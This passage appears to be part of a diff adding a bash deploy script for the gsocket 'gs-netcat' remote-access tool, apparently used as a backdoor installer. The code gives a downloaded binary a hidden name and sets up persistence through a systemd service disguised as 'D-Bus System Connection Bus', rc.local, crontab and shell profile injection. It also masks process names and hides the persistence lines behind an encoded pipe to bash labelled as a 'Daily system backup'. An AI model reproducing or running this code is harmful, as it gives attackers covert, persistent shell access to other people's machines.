+
+	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
+
+	RCLOCAL_DIR="${GS_PREFIX}/etc"
+	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
+
+	# Create a list of potential rc-files.
+	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
+	# - .bash_login is ignored if .bash_profile exists
+	# - $SHELL might not be set (if /bin/sh was gained by RCE)
+	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
+	if [[ -f ~/.bashrc ]]; then
+		RC_FN_LIST+=(".bashrc")
+		# Assume .bashrc is loaded by .bash_profile and .profile
+	else
+		# HERE: not bash or .bashrc does not exist
+		if [[ -f ~/.bash_profile ]]; then
+			RC_FN_LIST+=(".bash_profile")
+		elif [[ -f ~/.bash_login ]]; then
+			RC_FN_LIST+=(".bash_login")
+		fi
+	fi
+	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
+	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")
+
+	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
+	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
+	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
+
+	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
+	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
+
+	local pids
+	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
+	# and also matches kernel process '[kwapd0]'.
+	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
+	# OSX's pgrep works on argv[0] proc-name:
+	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
+
+	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
+	unset pids
+
+	# DL_CMD is used for help output of how to uninstall
+	if [[ -n "$GS_USELOCAL" ]]; then
+		DL_CMD="./deploy-all.sh"
+	elif command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		# Read-timeout is 900 seconds by default.
+		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+
+	else
+		DL=("false")   # Should not happen
+	fi
+
+	[[ $SHELL == *"nologin"* ]] && unset SHELL
+	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
+	[[ $SHELL == *"noshell"* ]] && unset SHELL  #  /usr/local/cpanel/bin/noshell
+	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
+	# Test that shell is a good shell.
+	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
+
+	DEBUGF "OLD_PIDS='$OLD_PIDS'"
+	DEBUGF "SRC_PKG=$SRC_PKG"
+}
+
+mk_encode()
+{
+	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null # AUTO-BACKUP ID: c3f9e0d1b8a7 >/dev/random # NOTE DO NOT REMOVE - Daily system backup"
+}
+
+init_setup()
+{
+	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
+	try_tmpdir "/dev/shm" ".gs-${UID}"
+	try_tmpdir "/tmp" ".gs-${UID}"
+	try_tmpdir "$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)" ".gs"
+	try_tmpdir "$(pwd)" ".gs-${UID}"
+
+	if [[ -n "$GS_PREFIX" ]]; then
+		# Debuggin and testing into separate directory
+		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)" 2>/dev/null
+		if [[ -f "$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/${RC_FN_LIST[1]}" ]]; then
+			xcp -p "$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/${RC_FN_LIST[1]}" "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/${RC_FN_LIST[1]}"
+		fi
+		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
+	fi
+
+	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
+	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
+
+	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
+	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null
+
+	# Find out which directory is writeable
+	init_dstbin
+
+	NOTE_DONOTREMOVE="# # DO NOT REMOVE - System Daily Cron"
+
+	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
+
+	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
+	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
+	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
+	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
+	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
+
+	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+
+	# There is no reliable way to check if a process is running:
+	# - Process might be running under different name. Especially OSX checks for the orginal name
+	#   but not the hidden name.
+	# - pkill or killall may have moved.
+	# The best we can do:
+	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
+	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
+
+
+	if [[ -n $ENCODE_STR ]]; then
+		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
+		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
+		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
+	fi
+
+	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
+	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
+	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
+	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "DSTBIN=${DSTBIN}"
+}
+
+uninstall_rm()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -f "$1" ]] && return # return if file does not exist
+
+	echo "Removing $1..."
+	xrm "$1" 2>/dev/null || return
+}
+
+uninstall_rmdir()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -d "$1" ]] && return # return if file does not exist
+
+	echo "Removing $1..."
+	xrmdir "$1" 2>/dev/null
+}
+
+uninstall_rc()
+{
+	local hname
+	local fn
+	hname="$2"
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return # File does not exist
+
+	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed
+
+	mk_file "$fn" || return
+
+	echo "Removing ${fn}..."
+	D="$(grep -v -F -- "${hname}" "$fn")"
+	echo "$D" >"${fn}" || return
+
+	[[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null # delete zero size file
+}
+
+uninstall_service()
+{
+	local dir
+	local sn
+	local sf
+	dir="$1"
+	sn="$2"
+	sf="${dir}/${sn}.service"
+
+	[[ ! -f "${sf}" ]] && return
+
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
+		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+		# STOPPING would kill the current login shell. Do not stop it.
+		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+=";systemctl stop ${sn}"
+	}
+
+	uninstall_rm "${sf}"
+} 
+
+# Rather important function especially when testing and developing this...
+uninstall()
+{
+	local hn
+	local fn
+	local cn
+	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+			uninstall_rm "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh/${cn}/${SEC_NAME}"  # SEC_NAME
+		done
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "/dev/shm/${hn}"
+		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_rm "${PWD}/${hn}"
+
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
+
+		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
+
+		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+
+		# Remove from login script
+		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+			uninstall_rc "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/${fn}" "${hn}"
+		done 
+		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"
+
+		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
+
+		## Systemd's gs-dbus.dat
+		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+	done
+
+	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+		uninstall_rmdir "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh/${cn}"
+	done
+	uninstall_rmdir "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh"
+	uninstall_rmdir "/tmp/.gsusr-${UID}"
+
+	uninstall_rm "${TMPDIR}/${SRC_PKG}"
+	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
+	uninstall_rmdir "${TMPDIR}"
+
+	# Remove crontab
+	unset regex
+	regex="dummy-not-exist"
+	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		# Escape regular exp special characters
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	done
+	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
+		ct="$(crontab -l 2>/dev/null)"
+		[[ "$ct" =~ ($regex) ]] && {
+			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
+			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
+		}
+	fi
+
+	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
+
+	echo -e "${CG}Uninstall complete.${CN}"
+	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
+	exit_code 0
+}
+
+SKIP_OUT()
+{
+	echo -e "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+}
+
+OK_OUT()
+{
+	echo -e "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+}
+
+FAIL_OUT()
+{
+	echo -e "..[${CR}FAILED${CN}]"
+	for str in "$@"; do
+		echo -e "--> $str"
+	done
+}
+
+WARN()
+{
+	echo -e "--> ${CY}WARNING: ${CN}$*"
+}
+
+WARN_EXECFAIL_SET()
+{
+	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
+	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
+WARN_EXECFAIL()
+{
+	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
+	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
+	echo -en "${CDR}"
+	ls -al "${DSTBIN}"
+	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
+--> GS_OSARCH=${OSARCH}
+--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
+--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Alternatively, try the static binary from
+--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
+}
+
+HOWTO_CONNECT_OUT()
+{
+	# After all install attempts output help how to uninstall
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e "--> To connect use one of the following:
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+}
+
+# Try to load a GS_SECRET
+gs_secret_reload()
+{
+	# DEBUGF "${CG}secret_load(${1})${CN}"
+	[[ -n $GS_SECRET_FROM_FILE ]] && return
+	[[ ! -f "$1" ]] && return
+
+	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
+	local sec
+	sec=$(<"$1")
+	[[ ${#sec} -lt 4 ]] && return
+	WARN "Using existing secret from '${1}'"
+	if [[ ${#sec} -lt 10 ]]; then
+		WARN "SECRET in '${1}' is very short! (${#sec})"
+	fi
+	GS_SECRET_FROM_FILE=$sec
+}
+
+gs_secret_write()
+{
+	mk_file "$1" || return
+	echo "$GS_SECRET" >"$1" || return
+}
+
+
+install_system_systemd()
+{
+	[[ ! -d "${SERVICE_DIR}" ]] && return
+	command -v systemctl >/dev/null || return
+	# test for:
+	# 1. offline
+	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+	if [[ -f "${SERVICE_FILE}" ]]; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			IS_GS_RUNNING=1
+		fi
+		IS_SYSTEMD=1
+		SKIP_OUT "${SERVICE_FILE} already exists."
+		return
+	fi
+
+	# Create the service file
+	mk_file "${SERVICE_FILE}" || return
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
+	echo "[Unit]
+Description=D-Bus System Connection Bus
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=300
+WorkingDirectory=/root
+ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+
+[Install]
+WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
+
+	gs_secret_write "$SYSTEMD_SEC_FILE"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
+
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
+
+	IS_SYSTEMD=1
+	((IS_INSTALLED+=1))
+}
+
+
+# inject a string ($2-) into the 2nd line of a file and retain the
+# PERM/TIMESTAMP of the target file ($1)
+install_to_file()
+{
+	local fname="$1"
+
+	shift 1
+
+	# If file does not exist then create with oldest TS
+	mk_file "$fname" || return
+
+	D="$(IFS=$'\n'; head -n1 "${fname}" && \
+		echo "${*}" && \
+		tail -n +2 "${fname}")"
+	echo 2>/dev/null "$D" >"${fname}" || return
+
+	true
+}
+
+install_system_rclocal()
+{
+	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	# Some systems have /etc/rc.local but it's not executeable...
+	[[ ! -x "${RCLOCAL_FILE}" ]] && return
+	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
+		return	
+	fi
+
+	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
+	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
+
+	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
+
+	gs_secret_write "$RCLOCAL_SEC_FILE"
+
+	((IS_INSTALLED+=1))
+}
+
+install_system()
+{
+	echo -en "Installing systemwide remote access permanentally....................."
+
+	# Try systemd first
+	install_system_systemd
+
+	# Try good old /etc/rc.local
+	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
+
+	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+
+	[[ -n $IS_SKIPPED ]] && return
+	
+	OK_OUT
+}
+
+install_user_crontab()
+{
+	command -v crontab >/dev/null || return # no crontab
+	echo -en "Installing access via crontab........................................."
+	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in crontab."
+		return
+	fi
+
+	[[ $UID -eq 0 ]] && {
+		mk_file "${CRONTAB_DIR}/root"
+	}
+
+	local old
+	old="$(crontab -l 2>/dev/null)" || {
+		# Create empty crontab (busybox) if no crontab exists at all.
+		crontab - </dev/null &>/dev/null
+	}
+	[[ -n $old ]] && old+=$'\n'
+
+	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user_profile()
+{
+	local rc_filename_status
+	local rc_file
+	local rc_filename
+
+	rc_filename="$1"
+	rc_filename_status="${rc_filename}................................"
+	rc_file="${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/${rc_filename}"
+
+	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
+	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${rc_file}"
+		return
+	fi
+
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user()
+{
+	# Use crontab if it's not in systemd (but might be in rc.local).
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		install_user_crontab
+	fi
+
+	[[ $IS_INSTALLED -ge 2 ]] && return
+	# install_user_profile
+	for x in "${RC_FN_LIST[@]}"; do
+		install_user_profile "$x"
+	done
+	gs_secret_write "$USER_SEC_FILE" # Create new secret file
+}
+
+ask_nocertcheck()
+{
+	WARN "Can not verify host. CA Bundle is not installed."
+	echo >&2 "--> Attempting without certificate verification."
+	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
+	echo -en >&2 "--> Continuing in "
+	local n
+
+	n=10
+	while :; do
+		echo -en >&2 "${n}.."
+		n=$((n-1))
+		[[ $n -eq 0 ]] && break 
+		read -r -t1 -n1 && break
+	done
+	[[ $n -gt 0 ]] || echo >&2 "0"
+
+	GS_NOCERTCHECK=1
+}
+
+# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
+# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
+dl_ssl()
+{
+	local cmd sslerr arg_nossl
+	cmd="$3"
+	sslerr="$2"
+	arg_nossl="$1"
+
+	shift 3
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
+		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
+	fi
+
+	FAIL_OUT "Certificate Error."
+	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
+	[[ -z $GS_NOCERTCHECK ]] && return
+
+	echo -en "--> Downloading binaries without certificate verification............."
+	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
+}
+
+# Download $1 and save it to $2
+dl()
+{
+	# Debugging / testing. Use local package if available
+	if [[ -n "$GS_USELOCAL" ]]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
+		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
+		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
+		errexit
+	fi
+
+	# Delete. Maybe previous download failed.
+	[[ -s "$2" ]] && rm -f "${2:?}"
+
+	if [[ -n $IS_USE_CURL ]]; then
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "CAN NOT HAPPEN"
+		errexit
+	fi
+
+	# Download failed:
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
+}
+
+# S= was set. Do not install but execute in place.
+gs_access()
+{
+	echo -e "Connecting..."
+	local ret
+	GS_SECRET="${S}"
+
+	"${DSTBIN}" -s "${GS_SECRET}" -i
+	ret=$?
+	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && {
+		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+	}
+
+	exit_code "$ret"
+}
+
+# Binary is in an executeable directory (no noexec-flag)
+# set IS_TESTBIN_OK if binary worked.
+# test_bin <binary>
+test_bin()
+{
+	local bin
+	unset IS_TESTBIN_OK
+
+	bin="$1"
+
+	# Try to execute the binary
+	unset ERR_LOG
+	GS_OUT=$("$bin" -g 2>&1)
+	ret=$?
+	[[ $ret -ne 0 ]] && {
+		# 126 - Exec format error
+		FAIL_OUT
+		ERR_LOG="$GS_OUT"
+		WARN_EXECFAIL_SET "$ret" "wrong binary"
+		return
+	}
+
+	# Use randomly generated secret unless it's set already (X=)
+	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+
+	IS_TESTBIN_OK=1
+}
+
+test_network()
+{
+	local ret
+	unset IS_TESTNETWORK_OK
+
+	# There should be no GS-NETCAT listening.
+	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
+	# 1. Exit=0 immediatly if server exists.
+	# 2. Exit=202 after n seconds. Firewalled/DNS?
+	# 3. Exit=203 if TCP to GSRN is refused.
+	# 3. Exit=61 on GS-Connection refused. (server does not exist)
+	# Do not need GS_ENV[*] here because all env variables are exported
+	# when exec is used.
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	ret=$?
+
+	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
+	[[ $ret -eq 139 ]] && { 
+		ERR_LOG=""
+		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
+		return
+	}
+
+	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
+		# 202 - Timeout (alarm)
+		# 203 - TCP connection refused
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		# EXIT if we can not check if SECRET has already been used.
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
+	}
+
+	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
+	# >1.4.40 return 203 (NETERROR)
+	[[ $ret -eq 255 ]] && {
+		# Connect reset by peer
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
+	}
+
+	[[ $ret -eq 0 ]] && {
+		FAIL_OUT "Secret '${GS_SECRET}' is already used."
+		HOWTO_CONNECT_OUT
+		exit_code 0
+	}
+
+	# Fail _unless_ it's ECONNREFUSED
+	[[ $ret -eq 61 ]] && {
+		# HERE: ECONNREFUSED
+		# Connection to GSRN was successfull and GSRN reports
+		# that no server is listening.
+		# This is a good enough test that this network & binary is working.
+		IS_TESTNETWORK_OK=1
+		return
+	}
+
+	# Unknown error condition
+	WARN_EXECFAIL_SET "$ret" "default pkg failed"
+}
+
+do_webhook()
+{
+	local arr
+	local IFS
+	local str
+
+	IFS=""
+	# Expand any $SECRET variable, etc.
+	while [[ $# -gt 0 ]]; do
+		# We need to escape all " to "'"'" to pass 'eval' correctly.
+		# (Note: This _WILL_ expand $-style variables - what we want)
+		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
+		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		str="${1//\"/\"'\"'\"}"
+        eval str=\""$str"\"
+		arr+=("$str")
+		shift 1
+	done
+
+	# echo "arr=${#arr[@]}: ${arr[@]}"
+	"${arr[@]}"
+}
+
+webhooks()
+{
+	local arr
+	local ok
+	local err
+
+	echo -en "Executing webhooks...................................................."
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
+
+	if [[ -n $IS_USE_CURL ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
+	elif [[ -n $IS_USE_WGET ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
+	fi
+	[[ -n $ok ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+}
+
+try_network()
+{
+	echo -en "Testing Global Socket Relay Network..................................."
+	test_network
+	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+	WARN_EXECFAIL
+}
+
+# try <osarch> <srcpackage>
+try()
+{
+	local osarch="$1"
+	local src_pkg="$2"
+
+	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
+	echo -e "--> Trying ${CG}${osarch}${CN}"
+	# Download binaries
+	echo -en "Downloading binaries.................................................."
+	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
+	OK_OUT
+
+	echo -en "Unpacking binaries...................................................."
